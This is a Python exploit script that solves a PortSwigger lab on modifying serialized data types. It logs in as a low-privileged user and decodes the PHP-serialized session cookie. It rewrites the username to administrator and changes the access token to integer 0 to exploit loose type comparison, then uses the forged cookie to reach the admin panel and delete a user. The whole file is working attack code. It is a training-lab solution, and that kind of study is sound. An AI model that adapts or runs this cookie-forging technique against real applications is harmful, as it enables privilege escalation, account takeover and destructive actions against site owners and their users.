# Modifying serialized data types

# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_session_cookie(s):
	print('[+] Extracting Wiener session Cookie...')
	cookie = urllib.parse.unquote(s.cookies['session'])
	print('[+] Found base64 Session Cookie:\t%s' % cookie)
	session_data = base64.b64decode(cookie).decode()
	print('[+] Decoded Session Cookie:\t\t%s' % session_data)
	return session_data

def modify_cookie(c):
	username = 'administrator'
	c_data = c.replace(f';s:{str(len("wiener"))}:', f';s:{str(len(username))}:').replace('wiener', username)
	c_modified = re.sub(r's:32:"(.*)"', 'i:0', c_data)
	print('[+] New Cookie value:\t\t%s' % c_modified)
	c_b64 = base64.b64encode(c_modified.encode()).decode()
	print('[+] Encoding to Base64:\t\t%s' % c_b64)
	cookie = urllib.parse.quote(c_b64)
	print('[+] Encoding to URL format:\t%s' % cookie)
	return cookie

def delete_carlos(s, url, cookie):
	admin_panel_path = url + '/admin'
	cookies = {'session': cookie}
	r = s.get(admin_panel_path, cookies=cookies)
	if r.status_code == 200:
		print('[+] Admin panel found !')
		delete_path = admin_panel_path + '/delete?username=carlos'
		print('[+] Trying to delete Carlos user...')
		r = s.get(delete_path, cookies=cookies)
		if r.status_code == 200:
			print('[+] Carlos user successfully deleted !')
		else:
			print('[-] Failed to delete Carlos user <!>')
	else:
		print('[-] Failed to find admin panel <!>')


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Modifying serialized data types')
	parser = argparse.ArgumentParser(description="[+] Lab: Modifying serialized data types")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos user...\n')
			time.sleep(1)
			print('[+] Trying to find serialized Cookies...')
			r = connect_as_wiener(s, url)
			time.sleep(1)
			session_cookie = get_session_cookie(s)
			print('\n[+] Trying to change the "username" value of the cookie...')
			print('\n[+] Trying to change the type of "access_token"in the cookie...')
			cookie = modify_cookie(session_cookie)
			s.cookies.clear()
			time.sleep(2)
			print('\n[+] Trying to access to admin panel...')
			r = delete_carlos(s, url, cookie)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
